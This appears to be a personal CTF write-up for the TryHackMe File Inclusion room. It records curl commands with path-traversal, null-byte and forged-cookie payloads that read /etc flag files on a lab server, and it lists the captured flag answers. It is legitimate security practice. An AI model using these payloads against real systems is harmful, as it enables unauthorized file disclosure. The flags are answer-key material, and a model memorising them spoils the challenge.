---
creation date: November 9th 2022
last modified date: November 9th 2022
aliases: []
tags: #🎌
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #🎌  

# [[THM - File Inclusion]]  


# Resolution summary
- Found the base challenge to be easy except when it came to challenge 2. Got stuck on cookie value was able to find Admin cookie in a few seconds but failed to realize that it was using the cookie value as the file path.

## Improved skills
- Path Traversal
- Curl tool

## Used tools
- [[curl]]

---

# Information Gathering
Scanned all TCP ports:
```bash

```

Enumerated open TCP ports:
```bash

```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration


---

# Exploitation
## Path Traversal
### Challenge 1
1.  `curl -d "file=welcome.php" -X POST http://10.10.206.47/challenges/chall1.php`
	- Input form broken need to use curl to run a POST request and feeding it "file=welcome.php" as a test.
		- We got a reply indicating that the server is responding to our requests
2. `curl -d "file=/etc/flag1" -X POST http://10.10.206.47/challenges/chall1.php`
	- Question indicated that flag was located at **/etc/flag1** tried to navigate there with **SUCCESS**
		- F1x3d-iNpu7-f0rrn
### Challenge 2
1. `curl -b "THM=Admin" -X POST http://10.10.206.47/challenges/chall2.php`
	- Form is blocked only allowing admins to view.
	- This value is set in cookie found while looking at Dev Tools > Network
	- Above command bypasses this and gets us a reply of "Welcome Admin"
2. `curl -b "THM=../../../" -X POST http://10.10.206.47/challenges/chall2.php`
	- Testing what happens if we feed other cookies
	- Found that its showing its using the Cookies value and adding on .php **../../../.php**
3. `curl -b "THM=../../../../../../etc/flag2%00" -X POST http://10.10.206.47/challenges/chall2.php`
	- Given flag at this point
		- c00k13_i5_yuMmy1
### Challenge 3
1. `curl http://10.10.206.47/challenges/chall3.php -d "file=../../../../../../etc/flag3%00" -o Challenge3.txt`
	- Spent a while trying to submit through but kept having my `../` removed even when trying `....//`
	- Finally tested with a **POST** and success it was filtering **GET**
2. Opened the file I saved output to and found the flag
	- P0st_1s_w0rk1in9

---

# Trophy & Loot
- Challenge 1: F1x3d-iNpu7-f0rrn
- Challenge 2: c00k13_i5_yuMmy1
- Challenge 3: P0st_1s_w0rk1in9
___

## Resources:

| Hyperlink                                 | Info |
| ----------------------------------------- | ---- |
| [THM](https://tryhackme.com/room/fileinc) | CTF  | 


Created Date: November 9th 2022 (10:20 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
